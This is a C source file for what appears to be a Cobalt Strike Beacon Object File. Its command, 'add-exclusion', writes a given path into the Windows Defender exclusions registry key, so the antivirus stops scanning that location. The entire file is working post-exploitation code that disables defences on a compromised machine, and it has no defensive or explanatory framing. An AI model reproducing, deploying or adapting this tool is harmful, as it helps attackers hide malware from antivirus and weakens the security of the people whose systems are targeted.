/*
 * add-exclusion <path> - add a Microsoft Defender path exclusion.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

void go(char *args, int alen)
{
    datap parser;
    char *path;
    int len = 0;
    HKEY h;
    DWORD zero = 0;
    LONG rc;

    if (!args || alen <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "usage: add-exclusion <path>\n");
        return;
    }

    BeaconDataParse(&parser, args, alen);
    path = BeaconDataExtract(&parser, &len);
    if (!path) return;

    rc = ADVAPI32$RegCreateKeyExA(HKEY_LOCAL_MACHINE,
                                  "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths",
                                  0, NULL, 0, KEY_SET_VALUE, NULL, &h, NULL);
    if (rc != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "RegCreateKeyEx failed: %ld (run as admin)\n", (long)rc);
        return;
    }

    rc = ADVAPI32$RegSetValueExA(h, path, 0, REG_DWORD, (const BYTE *)&zero, sizeof(zero));
    if (rc == ERROR_SUCCESS)
        BeaconPrintf(CALLBACK_OUTPUT, "Added Defender exclusion: %s\n", path);
    else
        BeaconPrintf(CALLBACK_ERROR, "RegSetValueEx failed: %ld\n", (long)rc);

    ADVAPI32$RegCloseKey(h);
}
